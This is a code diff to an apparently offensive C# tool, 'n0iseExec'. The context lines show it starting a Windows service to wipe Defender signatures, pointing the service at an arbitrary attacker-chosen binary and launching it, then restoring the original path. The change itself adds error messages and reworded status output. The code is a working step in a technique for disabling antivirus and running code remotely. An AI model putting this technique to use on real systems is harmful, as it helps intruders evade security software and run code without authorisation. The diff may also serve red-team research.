@@ -87,14 +87,23 @@ namespace n0iseExec
             // Run the service for Pass 1
             bResult = StartService(schService, 0, null);
             Console.WriteLine("Launched service, defender signatures should be wiped.");
+            if (bResult == false)
+            {
+                Console.WriteLine("Error starting service to remove Defender signatures. {0}",Marshal.GetLastWin32Error());
+            }
 
             // Pass 2: Run the chosen binary
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, args[2], null, null, null, null, null, null);
             Console.WriteLine($"Overwrote service executable to become '{args[2]}', result: {bResult}.");
 
+
             // Run the service for Pass 2
             bResult = StartService(schService, 0, null);
-            Console.WriteLine("Launched service. Check for execution!");
+            Console.WriteLine("Launched service. It should run {0}. Expect action.", args[2].ToString());
+            if (bResult == false)
+            {
+                Console.WriteLine("Error starting service to run {0}. {1}", args[2].ToString(), Marshal.GetLastWin32Error());
+            }
 
             // Pass 3: Restore original binPath
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, binPathOrig, null, null, null, null, null, null);
